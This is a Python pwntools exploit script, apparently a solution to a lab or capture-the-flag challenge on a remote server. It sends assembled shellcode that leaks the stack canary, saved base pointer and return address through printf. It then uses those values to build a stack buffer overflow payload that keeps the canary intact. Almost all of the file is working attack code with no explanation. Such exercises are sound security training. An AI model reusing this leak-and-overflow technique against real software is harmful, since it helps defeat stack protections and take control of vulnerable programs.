#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

exe = "./solver_sample" if len(sys.argv) < 2 else sys.argv[1];

# payload = None
# if os.path.exists(exe):
#     with open(exe, 'rb') as f:
#         payload = f.read()

# r = process("./remoteguess", shell=True)
# r = remote("localhost", 10816)
r = remote("up23.zoolab.org", 10816)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

payload = asm('''
    push rbp
    mov rbp, rsp
    sub rsp, 0x30
    mov [rbp-0x28], rdi
    mov rax,QWORD PTR fs:0x28
    mov QWORD PTR [rbp-0x8],rax
    mov rsi,[rbp-0x8]
    mov rcx,QWORD PTR [rbp]
    mov rdx,QWORD PTR [rbp+0x8]
    add rdx,0xab
    lea rdi,[rip+format_str]
    mov eax,0x0
    call QWORD PTR [rbp-0x28]
    leave
    ret
format_str:
    .asciz "%016llx%016llx%016llxcanary\\n"
'''
)


if payload != None:
    # ef = ELF(exe)
    # print("** {} bytes to submit, solver found at {:x}".format(len(payload), ef.symbols['solver']))
    r.sendlineafter(b'send to me? ', str(len(payload)).encode())
    r.sendlineafter(b'to call? ', str(0).encode())
    r.sendafter(b'bytes): ', payload)
    # # r.recvuntil(b'received.')
    seg = r.recvuntil(b'canary')[-54:-6]
    canary = seg[0:16]
    return_addr = seg[20:32]
    rbp = seg[36:48]
    print(seg)
    print(canary)
    print(rbp)
    print(return_addr)

    canary = int(canary.decode(), 16).to_bytes(8, byteorder='little')
    rbp = int(rbp.decode(), 16).to_bytes(8, byteorder='little')
    return_addr = int(return_addr.decode(), 16).to_bytes(8, byteorder='little')

    ans = b'1234\0'
    ans += b'0' * 19
    ans += canary
    ans += rbp
    ans += return_addr
    ans += b'0' * 12
    ans += p32(1234)
    print(ans)
    r.sendafter(b'answer? ', ans)

else:
    r.sendlineafter(b'send to me? ', b'0')


r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
